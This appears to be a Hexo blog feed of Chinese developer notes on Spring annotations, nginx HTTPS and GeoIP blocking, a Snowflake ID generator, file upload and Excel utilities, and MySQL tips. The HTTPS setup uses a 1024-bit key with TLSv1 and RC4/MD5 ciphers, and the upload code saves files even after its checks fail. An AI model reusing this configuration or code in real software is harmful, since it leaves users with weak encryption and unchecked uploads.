href="#ComponentScan" class="headerlink" title="@ComponentScan"></a>@ComponentScan</h3><p>这是 Spring 3.1 添加的一个注解，用来代替配置文件中的 component-scan 配置，开启组件扫描，即自动扫描包路径下的 @Component 注解进行注册 bean 实例到 context 中。</p><h3 id="Conditional"><a href="#Conditional" class="headerlink" title="@Conditional"></a>@Conditional</h3><p>这是 Spring 4.0 添加的新注解，用来标识一个 Spring Bean 或者 Configuration 配置文件，当满足指定的条件才开启配置。</p><h3 id="ConditionalOnBean"><a href="#ConditionalOnBean" class="headerlink" title="@ConditionalOnBean"></a>@ConditionalOnBean</h3><p>组合 @Conditional 注解，当容器中有指定的 Bean 才开启配置。</p><h3 id="ConditionalOnMissingBean"><a href="#ConditionalOnMissingBean" class="headerlink" title="@ConditionalOnMissingBean"></a>@ConditionalOnMissingBean</h3><p>组合 @Conditional 注解，和 @ConditionalOnBean 注解相反，当容器中没有指定的 Bean 才开启配置。</p><h3 id="ConditionalOnClass"><a href="#ConditionalOnClass" class="headerlink" title="@ConditionalOnClass"></a>@ConditionalOnClass</h3><p>组合 @Conditional 注解，当容器中有指定的 Class 才开启配置，自动配置中用的非常多。</p><h3 id="ConditionalOnMissingClass"><a href="#ConditionalOnMissingClass" class="headerlink" title="@ConditionalOnMissingClass"></a>@ConditionalOnMissingClass</h3><p>组合 @Conditional 注解，和 @ConditionalOnMissingClass 注解相反，当容器中没有指定的 Class 才开启配置。</p><h3 id="ConditionalOnWebApplication"><a href="#ConditionalOnWebApplication" class="headerlink" title="@ConditionalOnWebApplication"></a>@ConditionalOnWebApplication</h3><p>组合 @Conditional 注解，当前项目类型是 WEB 项目才开启配置。</p><p>当前项目有以下 3 种类型。</p><pre><code>enum Type {/** * Any web application will match. */ANY,/** * Only servlet-based web application will match. */SERVLET,/** * Only reactive-based web application will match. */REACTIVE</code></pre><h3 id="ConditionalOnNotWebApplication"><a href="#ConditionalOnNotWebApplication" class="headerlink" title="@ConditionalOnNotWebApplication"></a>@ConditionalOnNotWebApplication</h3><p>组合 @Conditional 注解，和 @ConditionalOnWebApplication 注解相反，当前项目类型不是 WEB 项目才开启配置。</p><h3 id="ConditionalOnProperty"><a href="#ConditionalOnProperty" class="headerlink" title="@ConditionalOnProperty"></a>@ConditionalOnProperty</h3><p>组合 @Conditional 注解，当指定的属性有指定的值时才开启配置。</p><h3 id="ConditionalOnExpression"><a href="#ConditionalOnExpression" class="headerlink" title="@ConditionalOnExpression"></a>@ConditionalOnExpression</h3><p>组合 @Conditional 注解，当 SpEL 表达式为 true 时才开启配置。</p><h3 id="ConditionalOnJava"><a href="#ConditionalOnJava" class="headerlink" title="@ConditionalOnJava"></a>@ConditionalOnJava</h3><p>组合 @Conditional 注解，当运行的 Java JVM 在指定的版本范围时才开启配置。</p><h3 id="ConditionalOnResource"><a href="#ConditionalOnResource" class="headerlink" title="@ConditionalOnResource"></a>@ConditionalOnResource</h3><p>组合 @Conditional 注解，当类路径下有指定的资源才开启配置。</p><h3 id="ConditionalOnJndi"><a href="#ConditionalOnJndi" class="headerlink" title="@ConditionalOnJndi"></a>@ConditionalOnJndi</h3><p>组合 @Conditional 注解，当指定的 JNDI 存在时才开启配置, JNDI 现在用的不多。</p><h3 id="ConditionalOnCloudPlatform"><a href="#ConditionalOnCloudPlatform" class="headerlink" title="@ConditionalOnCloudPlatform"></a>@ConditionalOnCloudPlatform</h3><p>组合 @Conditional 注解，当指定的云平台激活时才开启配置。</p><h3 id="ConditionalOnSingleCandidate"><a href="#ConditionalOnSingleCandidate" class="headerlink" title="@ConditionalOnSingleCandidate"></a>@ConditionalOnSingleCandidate</h3><p>组合 @Conditional 注解，当指定的 class 在容器中只有一个 Bean，或者同时有多个但为首选时才开启配置。</p><h3 id="ConfigurationProperties"><a href="#ConfigurationProperties" class="headerlink" title="@ConfigurationProperties"></a>@ConfigurationProperties</h3><p>用来加载额外的配置（如 .properties 文件），可用在 @Configuration 注解类，或者 @Bean 注解方法上面。</p><h3 id="EnableConfigurationProperties"><a href="#EnableConfigurationProperties" class="headerlink" title="@EnableConfigurationProperties"></a>@EnableConfigurationProperties</h3><p>一般要配合 @ConfigurationProperties 注解使用，用来开启对 @ConfigurationProperties 注解配置 Bean 的支持。</p><h3 id="AutoConfigureAfter"><a href="#AutoConfigureAfter" class="headerlink" title="@AutoConfigureAfter"></a>@AutoConfigureAfter</h3><p>用在自动配置类上面，表示该自动配置类需要在另外指定的自动配置类配置完之后。</p><p>如 Mybatis 的自动配置类，需要在数据源自动配置类之后。</p><p>@AutoConfigureAfter(DataSourceAutoConfiguration.class) public class MybatisAutoConfiguration { 23、@AutoConfigureBefore</p><p>这个和 @AutoConfigureAfter 注解使用相反，表示该自动配置类需要在另外指定的自动配置类配置之前。</p><h3 id="Import"><a href="#Import" class="headerlink" title="@Import"></a>@Import</h3><p>这是 Spring 3.0 添加的新注解，用来导入一个或者多个 @Configuration 注解修饰的类，这在 Spring Boot 里面应用很多。</p><h3 id="ImportResource"><a href="#ImportResource" class="headerlink" title="@ImportResource"></a>@ImportResource</h3><p>这是 Spring 3.0 添加的新注解，用来导入一个或者多个 Spring 配置文件，这对 Spring Boot 兼容老项目非常有用，因为有些配置无法通过 Java Config 的形式来配置就只能用这个注解来导入。</p><h2 id="SpringMVC-注解"><a href="#SpringMVC-注解" class="headerlink" title="SpringMVC 注解"></a>SpringMVC 注解</h2>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>nginx 配置 https</title>
      <link href="/Nginx/nginx/nginx-https/"/>
      <url>/Nginx/nginx/nginx-https/</url>
      
        <content type="html"><![CDATA[<h2 id="准备证书"><a href="#准备证书" class="headerlink" title="准备证书"></a>准备证书</h2><h3 id="1、生成RSA私钥"><a href="#1、生成RSA私钥" class="headerlink" title="1、生成RSA私钥"></a>1、生成RSA私钥</h3><p>命令：openssl genrsa -des3 -out server.key 1024</p><p>说明：生成rsa私钥，des3算法，1024强度，server.key是秘钥文件名</p><h3 id="2、生成证书签名请求CSR"><a href="#2、生成证书签名请求CSR" class="headerlink" title="2、生成证书签名请求CSR"></a>2、生成证书签名请求CSR</h3><p>命令： openssl req -new -key server.key -out server.csr -config openssl.cnf</p><p>说明：openssl.cnf是OpenSSL的配置文件，通常放在/usr/lib/ssl/openssl.cnf</p><p>注意：需要依次输入国家，地区，城市，组织，组织单位，Common Name和Email。其中Common Name，必须写域名，若是测试可以写localhost</p><h3 id="3、生成自签名的证书"><a href="#3、生成自签名的证书" class="headerlink" title="3、生成自签名的证书"></a>3、生成自签名的证书</h3><p>命令： openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt</p><h2 id="配置-nginx"><a href="#配置-nginx" class="headerlink" title="配置 nginx"></a>配置 nginx</h2><pre><code>server{    listen  443 ssl;    server_name 你的域名或ip;    keepalive_timeout   70;    ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;    ssl_ciphers         AES128-SHA:AES256-SHA:RC4-SHA:DES-CBC3-SHA:RC4-MD5;    ssl_certificate     /etc/nginx/ssl/server.crt;   #证书路径    ssl_certificate_key /etc/nginx/ssl/server.key;   #私钥路径    ssl_session_cache   shared:SSL:10m;    ssl_session_timeout 10m;    location / {        proxy_pass http://127.0.0.1:8080/;   #转发到tomcat        proxy_set_header Host       $http_host;        proxy_set_header X-Real-IP $remote_addr;          proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;          proxy_set_header X-Forwarded-Proto $scheme;    }}</code></pre><h2 id="http-跳转到-https"><a href="#http-跳转到-https" class="headerlink" title="http 跳转到 https"></a>http 跳转到 https</h2><pre><code class="java">server {    listen 80;    server_name 你的域名或ip;    rewrite ^(.*)$  https://$host$1 permanent;   #强制转https    location ~ / {    　　root /var/www/html/8080;    　　index index.html index.php index.htm;    }}</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><p>OpenSSL生成自签名的证书：<a href="https://www.cnblogs.com/hnxxcxg/p/7610582.html" target="_blank" rel="noopener">https://www.cnblogs.com/hnxxcxg/p/7610582.html</a></p></li><li><p>nginx配置https：<a href="https://www.cnblogs.com/kevingrace/p/6187072.html" target="_blank" rel="noopener">https://blog.csdn.net/hylexus/article/details/53152701</a></p></li><li><p>http强转https：<a href="https://www.cnblogs.com/kevingrace/p/6187072.html" target="_blank" rel="noopener">https://www.cnblogs.com/kevingrace/p/6187072.html</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>转发到一个页面，用于维护或者单页应用</title>
      <link href="/Nginx/nginx/nginx-rewrite-one-page/"/>
      <url>/Nginx/nginx/nginx-rewrite-one-page/</url>
      
        <content type="html"><![CDATA[<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><pre><code>server{            listen 80;   # nginx监听的端口            root /opt/apache-tomcat-8.0.50/webapps/ROOT;   # tomcat的root路径            server_name 47.95.*.*;   # 当前主机的域名或ip            location / {                    rewrite ^(.*)$ /maintain.html break;   # 要跳转到的页面路径            }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx拦截指定国家的IP</title>
      <link href="/Nginx/nginx/nginx-block-via-ip/"/>
      <url>/Nginx/nginx/nginx-block-via-ip/</url>
      
        <content type="html"><![CDATA[<h2 id="一、下载GeoIP数据库"><a href="#一、下载GeoIP数据库" class="headerlink" title="一、下载GeoIP数据库"></a>一、下载GeoIP数据库</h2><pre><code>wget http://geolite.maxmind.com/download/geoip/api/c/GeoIP.tar.gzwget http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gzwget http://geolite.maxmind.com/download/geoip/database/GeoLiteCountry/GeoIP.dat.gz</code></pre><h2 id="二、安装GeoIP"><a href="#二、安装GeoIP" class="headerlink" title="二、安装GeoIP"></a>二、安装GeoIP</h2><pre><code>tar -xzvf GeoIP.tar.gzcd GeoIP./configuremake &amp;&amp; make install</code></pre><h2 id="三、解压GeoLiteCity-dat-gz和GeoIP-dat-gz"><a href="#三、解压GeoLiteCity-dat-gz和GeoIP-dat-gz" class="headerlink" title="三、解压GeoLiteCity.dat.gz和GeoIP.dat.gz"></a>三、解压GeoLiteCity.dat.gz和GeoIP.dat.gz</h2><pre><code>gunzip GeoIP.dat.gzgunzip GeoLiteCity.dat.gz </code></pre><h2 id="四、将上面两个文件夹移动到自定义目录，我这儿是-etc-nginx-geoip"><a href="#四、将上面两个文件夹移动到自定义目录，我这儿是-etc-nginx-geoip" class="headerlink" title="四、将上面两个文件夹移动到自定义目录，我这儿是/etc/nginx/geoip"></a>四、将上面两个文件夹移动到自定义目录，我这儿是/etc/nginx/geoip</h2><pre><code>mv GeoIP.dat /opt/nginx/geoip/mv GeoLiteCity.dat /opt/nginx/geoip/</code></pre><h2 id="五、修改nginx的配置文件nginx-conf"><a href="#五、修改nginx的配置文件nginx-conf" class="headerlink" title="五、修改nginx的配置文件nginx.conf"></a>五、修改nginx的配置文件nginx.conf</h2><h3 id="5-1在http模块加入GeoIP库的路径（注意要换成你自己的路径）"><a href="#5-1在http模块加入GeoIP库的路径（注意要换成你自己的路径）" class="headerlink" title="5.1在http模块加入GeoIP库的路径（注意要换成你自己的路径）"></a>5.1在http模块加入GeoIP库的路径（注意要换成你自己的路径）</h3><pre><code>geoip_country  /etc/nginx/geoip/GeoIP.dat;geoip_city     /etc/nginx/geoip/GeoLiteCity.dat;</code></pre><h3 id="5-2在server模块拦截指定国家IP（这里以中国CN为例，其他国家的代码可以自己问问度娘或者谷歌）"><a href="#5-2在server模块拦截指定国家IP（这里以中国CN为例，其他国家的代码可以自己问问度娘或者谷歌）" class="headerlink" title="5.2在server模块拦截指定国家IP（这里以中国CN为例，其他国家的代码可以自己问问度娘或者谷歌）"></a>5.2在server模块拦截指定国家IP（这里以中国CN为例，其他国家的代码可以自己问问度娘或者谷歌）</h3><pre><code>if ($geoip_country_code = CN) {    return 403;}</code></pre><p>这里返回403在页面上来看就是nginx的403默认页面</p><p>如果要跳转到自定义页面，第一步再定义一个server模块用于访问自定义页面</p><pre><code>server {    listen 81;    #可以自定义端口（注意不要被占用了）    server_name your_server_name;     #这里填写你的ip或域名    root /usr/local/nginx/html/;      # 存放自定义页面的根目录    index index.html;     #自定义页面}</code></pre><p>第二步将“return 403”修改为重定向</p><pre><code>if ($geoip_country_code = CN) {    rewrite ^/(.*) http://your_server_name:81/ break;}your_server_name就是第一步中定义的server模块中的ip或域名，端口也要加上</code></pre><p>ps：我看网上说可以自定义403页面然后直接“return 403”就可以跳转到自定义页面了，</p><p>我试过好像不行，在if语句里面无法直接return到自定义页面，</p><p>但是在if块外面是可以自定义403页面的。</p><p>有没有大神有更简单的方法跳转到自定义页面，欢迎评论O(∩_∩)O哈哈~</p>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>UUID 生成</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/UUID-generation/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/UUID-generation/</url>
      
        <content type="html"><![CDATA[<h2 id="使用雪花算法"><a href="#使用雪花算法" class="headerlink" title="使用雪花算法"></a>使用雪花算法</h2><p><img src="/技术方案/solution/UUID-generation/13382703-b64e38457ddd13e2.jpg" alt="img"></p><p><strong>SnowFlake可以保证：</strong></p><ol><li>所有生成的id按时间趋势递增</li><li>整个分布式系统内不会产生重复id（因为有datacenterId和workerId来做区分）</li></ol><pre><code>package com.qingmu.mybaitsplus.util;public class IdWorker {    //下面两个每个5位，加起来就是10位的工作机器id    private static long workerId;    //工作id    private static long datacenterId;   //数据id    //12位的序列号    private static long sequence;    public IdWorker(long workerId, long datacenterId, long sequence) {        // sanity check for workerId        if (workerId &gt; maxWorkerId || workerId &lt; 0) {            throw new IllegalArgumentException(String.format(&quot;worker Id can&#39;t be greater than %d or less than 0&quot;, maxWorkerId));        }        if (datacenterId &gt; maxDatacenterId || datacenterId &lt; 0) {            throw new IllegalArgumentException(String.format(&quot;datacenter Id can&#39;t be greater than %d or less than 0&quot;, maxDatacenterId));        }        System.out.printf(&quot;worker starting. timestamp left shift %d, datacenter id bits %d, worker id bits %d, sequence bits %d, workerid %d&quot;,                timestampLeftShift, datacenterIdBits, workerIdBits, sequenceBits, workerId);        this.workerId = workerId;        this.datacenterId = datacenterId;        this.sequence = sequence;    }    //初始时间戳    private static long twepoch = 1288834974657L;    //长度为5位    private static long workerIdBits = 5L;    private static long datacenterIdBits = 5L;    //最大值    private long maxWorkerId = -1L ^ (-1L &lt;&lt; workerIdBits);    private long maxDatacenterId = -1L ^ (-1L &lt;&lt; datacenterIdBits);    //序列号id长度    private static long sequenceBits = 12L;    //序列号最大值    private static long sequenceMask = -1L ^ (-1L &lt;&lt; sequenceBits);    //工作id需要左移的位数，12位    private static long workerIdShift = sequenceBits;    //数据id需要左移位数 12+5=17位    private static long datacenterIdShift = sequenceBits + workerIdBits;    //时间戳需要左移位数 12+5+5=22位    private static long timestampLeftShift = sequenceBits + workerIdBits + datacenterIdBits;    //上次时间戳，初始值为负数    private static long lastTimestamp = -1L;    public long getWorkerId() {        return workerId;    }    public long getDatacenterId() {        return datacenterId;    }    public long getTimestamp() {        return System.currentTimeMillis();    }    //下一个ID生成算法    public static synchronized long nextId() {        long timestamp = timeGen();        //获取当前时间戳如果小于上次时间戳，则表示时间戳获取出现异常        if (timestamp &lt; lastTimestamp) {            System.err.printf(&quot;clock is moving backwards.  Rejecting requests until %d.&quot;, lastTimestamp);            throw new RuntimeException(String.format(&quot;Clock moved backwards.  Refusing to generate id for %d milliseconds&quot;,                    lastTimestamp - timestamp));        }        //获取当前时间戳如果等于上次时间戳（同一毫秒内），则在序列号加一；否则序列号赋值为0，从0开始。        if (lastTimestamp == timestamp) {            sequence = (sequence + 1) &amp; sequenceMask;            if (sequence == 0) {                timestamp = tilNextMillis(lastTimestamp);            }        } else {            sequence = 0;        }        //将上次时间戳值刷新        lastTimestamp = timestamp;        /**         * 返回结果：         * (timestamp - twepoch) &lt;&lt; timestampLeftShift) 表示将时间戳减去初始时间戳，再左移相应位数         * (datacenterId &lt;&lt; datacenterIdShift) 表示将数据id左移相应位数         * (workerId &lt;&lt; workerIdShift) 表示将工作id左移相应位数         * | 是按位或运算符，例如：x | y，只有当x，y都为0的时候结果才为0，其它情况结果都为1。         * 因为个部分只有相应位上的值有意义，其它位上都是0，所以将各部分的值进行 | 运算就能得到最终拼接好的id         */        return ((timestamp - twepoch) &lt;&lt; timestampLeftShift) |                (datacenterId &lt;&lt; datacenterIdShift) |                (workerId &lt;&lt; workerIdShift) |                sequence;    }    //获取时间戳，并与上次时间戳比较    private static long tilNextMillis(long lastTimestamp) {        long timestamp = timeGen();        while (timestamp &lt;= lastTimestamp) {            timestamp = timeGen();        }        return timestamp;    }    //获取系统时间戳    private static long timeGen() {        return System.currentTimeMillis();    }    //---------------测试---------------    public static void main(String[] args) {        IdWorker worker = new IdWorker(1, 1, 1);        for (int i = 0; i &lt; 30; i++) {            System.out.println(worker.nextId());        }    }}</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://segmentfault.com/a/1190000011282426" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011282426</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>对象转换</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/object-mapping/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/object-mapping/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-ModelMapper"><a href="#使用-ModelMapper" class="headerlink" title="使用 ModelMapper"></a>使用 ModelMapper</h2><pre><code class="java">ModelMapper modelMapper = new ModelMapper();modelMapper.addMappings(new PropertyMap&lt;User, CustomUserDetails&gt;() {    @Override    protected void configure() {        map().setRoles(source.getRolesAsString());    }});return modelMapper.map(user, CustomUserDetails.class);</code></pre><p><a href="http://modelmapper.org/" target="_blank" rel="noopener">http://modelmapper.org/</a></p><h2 id="使用-orika"><a href="#使用-orika" class="headerlink" title="使用 orika"></a>使用 orika</h2><pre><code class="java">MapperFactory mapperFactory = new DefaultMapperFactory.Builder().build();MapperFacade mapperFacade = mapperFactory.getMapperFacade();Teacher teacher = mapperFacade.map(stu,Teacher.class);</code></pre>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Yaml 解析</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/yaml-parse/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/yaml-parse/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-spring-自带功能"><a href="#使用-spring-自带功能" class="headerlink" title="使用 spring 自带功能"></a>使用 spring 自带功能</h2><pre><code class="java"> YamlMapFactoryBean yamlMapFactoryBean = new YamlMapFactoryBean();        yamlMapFactoryBean.setResources(new ClassPathResource(&quot;application.yml&quot;));        yamlMapFactoryBean.afterPropertiesSet();        Map&lt;String, Object&gt; object = yamlMapFactoryBean.getObject();        Object nameUrl = object.get(&quot;pnameUrl&quot;);</code></pre>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PDF 导出</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/pdf-export/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/pdf-export/</url>
      
        <content type="html"><![CDATA[<h2 id="itextpdf-freemarker"><a href="#itextpdf-freemarker" class="headerlink" title="itextpdf + freemarker"></a>itextpdf + freemarker</h2><p><a href="https://github.com/youzhibing/itextpdf" target="_blank" rel="noopener">https://github.com/youzhibing/itextpdf</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>文件上传</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/file-upload/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/file-upload/</url>
      
        <content type="html"><![CDATA[<h2 id="上传到本地服务器"><a href="#上传到本地服务器" class="headerlink" title="上传到本地服务器"></a>上传到本地服务器</h2><pre><code class="java">public class UploadImgUtils {    private static String savePath = &quot;&quot;;    /**     * 上传照片工具类     *     * @param file     文件     * @param workNo   工单号     * @param property 配置的环境（dev,prod,test）     * @return     * @throws OperationException     */    public static String uploadImg(MultipartFile file, String workNo, String property) throws OperationException {        if (file == null) {          System.out.println(&quot;异常&quot;);         }        if (file.getSize() &gt; 1024 * 1024 * 1) {          System.out.println(&quot;异常&quot;);        }        //获取文件后缀        String suffix = file.getOriginalFilename().substring(file.getOriginalFilename().lastIndexOf(&quot;.&quot;) + 1);        if (!&quot;jpg,jpeg,gif,png&quot;.toUpperCase().contains(suffix.toUpperCase())) {            System.out.println(&quot;异常&quot;);        }        //对savePath进行过赋值        getProperties(property);        File savePathFile = new File(savePath);        if (!savePathFile.exists()) {            //若不存在该目录，则创建目录            savePathFile.mkdir();        }        //用工单号作为唯一的标识符        String filename = workNo + &quot;.&quot; + suffix;        try {            //将文件保存指定目录            file.transferTo(new File(savePath + filename));        } catch (Exception e) {           System.out.println(&quot;异常&quot;);        }        //返回文件名称        return savePath + filename;    }    /**     * 读取配置文件中的信息.     *     * @return     */    private static void getProperties(String name) {        YamlPropertiesFactoryBean factoryBean = new YamlPropertiesFactoryBean();        factoryBean.setResources(new ClassPathResource(&quot;application-&quot; + name + &quot;.yml&quot;));        factoryBean.afterPropertiesSet();        Properties object = factoryBean.getObject();在配置文件中书写配置路径信息        savePath = (String) object.get(&quot;savePath&quot;);    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>导出到 Excel</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/java-excel-export/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/java-excel-export/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-hutool-工具类导出"><a href="#使用-hutool-工具类导出" class="headerlink" title="使用 hutool 工具类导出"></a>使用 hutool 工具类导出</h2><pre><code class="java">public class ExcelUtils {    private static final Logger logger = LoggerFactory.getLogger(ExcelUtils.class);    private static List&lt;List&lt;Object&gt;&gt; lineList = new ArrayList&lt;&gt;();    /**     * excel 导出工具类     *     * @param response     * @param fileName    文件名     * @param projects    对象集合     * @param columnNames 导出的excel中的列名     * @param keys        对应的是对象中的字段名字     * @throws IOException     */    public static void export(HttpServletResponse response, String fileName, List&lt;?&gt; projects, String[] columnNames, String[] keys) throws IOException {        ExcelWriter bigWriter = ExcelUtil.getBigWriter();        for (int i = 0; i &lt; columnNames.length; i++) {            bigWriter.addHeaderAlias(columnNames[i], keys[i]);            bigWriter.setColumnWidth(i, 20);        }        // 一次性写出内容，使用默认样式，强制输出标题        bigWriter.write(projects, true);        //response为HttpServletResponse对象        response.setContentType(&quot;application/vnd.ms-excel;charset=utf-8&quot;);        //test.xls是弹出下载对话框的文件名，不能为中文，中文请自行编码        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=&quot; + new String((fileName + &quot;.xlsx&quot;).getBytes(), &quot;iso-8859-1&quot;));        ServletOutputStream out = response.getOutputStream();        bigWriter.flush(out, true);        // 关闭writer，释放内存        bigWriter.close();        //此处记得关闭输出Servlet流        IoUtil.close(out);    }    /**     * excel导入工具类     *     * @param file       文件     * @param columNames 列对应的字段名     * @return 返回数据集合     * @throws OperationException     * @throws IOException     */    public static List&lt;Map&lt;String, Object&gt;&gt; leading(MultipartFile file, String[] columNames) throws OperationException, IOException {        String fileName = file.getOriginalFilename();        // 上传文件为空        if (StringUtils.isEmpty(fileName)) {            throw new OperationException(ReturnCodeEnum.OPERATION_EXCEL_ERROR, &quot;没有导入文件&quot;);        }        //上传文件大小为1000条数据        if (file.getSize() &gt; 1024 * 1024 * 10) {            logger.error(&quot;upload | 上传失败: 文件大小超过10M，文件大小为：{}&quot;, file.getSize());            throw new OperationException(ReturnCodeEnum.OPERATION_EXCEL_ERROR, &quot;上传失败: 文件大小不能超过10M!&quot;);        }        // 上传文件名格式不正确        if (fileName.lastIndexOf(&quot;.&quot;) != -1 &amp;&amp; !&quot;.xlsx&quot;.equals(fileName.substring(fileName.lastIndexOf(&quot;.&quot;)))) {            throw new OperationException(ReturnCodeEnum.OPERATION_EXCEL_ERROR, &quot;文件名格式不正确, 请使用后缀名为.XLSX的文件&quot;);        }        //读取数据        ExcelUtil.read07BySax(file.getInputStream(), 0, createRowHandler());        //去除excel中的第一行数据        lineList.remove(0);        //将数据封装到list&lt;Map&gt;中        List&lt;Map&lt;String, Object&gt;&gt; dataList = new ArrayList&lt;&gt;();        for (int i = 0; i &lt; lineList.size(); i++) {            if (null != lineList.get(i)) {                Map&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();                for (int j = 0; j &lt; columNames.length; j++) {                    Object property = lineList.get(i).get(j);                    hashMap.put(columNames[j], property);                }                dataList.add(hashMap);            } else {                break;            }        }        return dataList;    }    /**     * 通过实现handle方法编写我们要对每行数据的操作方式     */    private static RowHandler createRowHandler() {        //清空一下集合中的数据        lineList.removeAll(lineList);        return new RowHandler() {            @Override            public void handle(int sheetIndex, int rowIndex, List rowlist) {                //将读取到的每一行数据放入到list集合中                JSONArray jsonObject = new JSONArray(rowlist);                lineList.add(jsonObject.toList(Object.class));            }        };    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>如何更好地阅读源代码</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/how-to-read-source-code/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/how-to-read-source-code/</url>
      
        <content type="html"><![CDATA[<ul><li>使用 debug 调试跟踪</li><li>每个阶段记录笔记，抵抗遗忘</li><li>梳理关键概念</li><li>将关键的一些机制自己实现一下</li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mysql 性能优化</title>
      <link href="/mysql/mysql/mysql-performance/"/>
      <url>/mysql/mysql/mysql-performance/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-基础"><a href="#Java-基础" class="headerlink" title="Java 基础"></a>Java 基础</h2><h2 id="MySQL基础"><a href="#MySQL基础" class="headerlink" title="MySQL基础"></a>MySQL基础</h2><p>1、请解释关系型数据库概念及主要特点？</p><p>2、请说出关系型数据库的典型产品、特点及应用场景？</p><p>3、请详细描述 SQL 语句分类及对应代表性关键字。</p><p>4、什么是 MySQL 多实例，如何配置 MySQL 多实例？</p><p>5、如何加强 MySQL 安全，请给出可行的具体措施？</p><p>6、误操作执行了一个 drop 库 SQL 语句，如何完整恢复？</p><p>7、详述 MySQL 主从复制原理及配置主从的完整步骤。</p><p>8、MySQL 如何实现双向互为主从复制，并说明应用场景？</p><p>9、MySQL 如何实现级联同步，并说明应用场景？</p><p>10、MySQL 主从复制故障如何解决？</p><p>11、Mysql 中有哪几种锁？</p><p>12、MYSQL 数据表在什么情况下容易损坏？</p><p>13、MySQL 里记录货币用什么字段类型好</p><p>14、MYSQL 支持事务吗？</p><p>15、解释访问控制列表</p><p>16、什么是通用 SQL 函数？</p><p>17、什么是非标准字符串类型？</p><p>18、Mysql 表中允许有多少个 TRIGGERS？</p><p>19、什么样的对象可以使用 CREATE 语句创建？</p><p>20、NOW（）和 CURRENT_DATE（）有什么区别？</p><p>21、可以使用多少列创建索引？</p><p>22、InnoDB 是什么？</p><p>23、Mysql 如何优化 DISTINCT？</p><p>24、如何输入字符为十六进制数字？</p><p>25、如何显示前 50 行？</p><h2 id="MySQL-性能优化"><a href="#MySQL-性能优化" class="headerlink" title="MySQL 性能优化"></a>MySQL 性能优化</h2><p>1、为查询缓存优化你的查询</p><p>2、EXPLAIN 你的 SELECT 查询</p><p>3、当只要一行数据时使用 LIMIT 1</p><p>4、为搜索字段建索引</p><p>5、在 Join 表的时候使用相当类型的例，并将其索引</p><p>6、千万不要 ORDER BY RAND()</p><p>7、避免 SELECT *</p><p>8、永远为每张表设置一个 ID</p><p>9、使用 ENUM 而不是 VARCHAR</p><p>10、从 PROCEDURE ANALYSE() 取得建议</p><p>11、尽可能的使用 NOT NULL</p><p>12、Prepared Statements</p><p>13、无缓冲的查询</p><p>14、把 IP 地址存成 UNSIGNED INT</p><p>15、固定长度的表会更快</p><p>16、垂直分割</p><p>17、拆分大的 DELETE 或 INSERT 语句</p><p>18、越小的列会越快</p><p>19、选择正确的存储引擎</p><p>20、使用一个对象关系映射器(Object Relational Mapper)</p><p>21、小心“永久链接”</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.jianshu.com/p/73789fca138b" target="_blank" rel="noopener">https://www.jianshu.com/p/73789fca138b</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 源码分析</title>
      <link href="/Spring/spring/spring-boot-workflow/"/>
